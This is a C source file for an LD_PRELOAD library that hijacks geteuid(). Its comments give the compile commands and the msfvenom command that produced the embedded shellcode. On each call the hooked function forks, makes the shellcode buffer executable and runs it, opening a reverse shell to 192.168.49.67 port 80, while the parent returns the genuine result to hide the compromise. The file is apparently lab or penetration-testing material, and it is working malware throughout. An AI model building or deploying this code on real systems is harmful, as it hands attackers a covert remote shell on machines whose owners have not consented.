#define _GNU_SOURCE
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

// To compile:
// gcc -Wall -fPIC -z execstack -c -o sharedLibrary_LD_PRELOAD.o sharedLibrary_LD_PRELOAD.c
// gcc -shared -o sharedLibrary_LD_PRELOAD.so sharedLibrary_LD_PRELOAD.o -ldl

// msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.67 LPORT=80 -f c
unsigned char buf[] = 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x00\x50\xc0\xa8\x31\x43\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

uid_t geteuid(void)
{
        // Get the address of the original 'geteuid' function
        typeof(geteuid) *old_geteuid;
        old_geteuid = dlsym(RTLD_NEXT, "geteuid");

        // Fork a new thread based on the current one
        if (fork() == 0)
        {
                // Execute shellcode in the new thread
                intptr_t pagesize = sysconf(_SC_PAGESIZE);

                // Make memory executable (required in libs)
                if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)), pagesize, PROT_READ|PROT_EXEC)) {
                        // Handle error
                        perror("mprotect");
                        return -1;
                }

                // Cast and execute
                int (*ret)() = (int(*)())buf;
                ret();
        }
        else
        {
                // Original thread, call the original function
                printf("[Hijacked] Returning from function...\n");
                return (*old_geteuid)();
        }
        // This shouldn't really execute
        printf("[Hijacked] Returning from main...\n");
        return -2;
}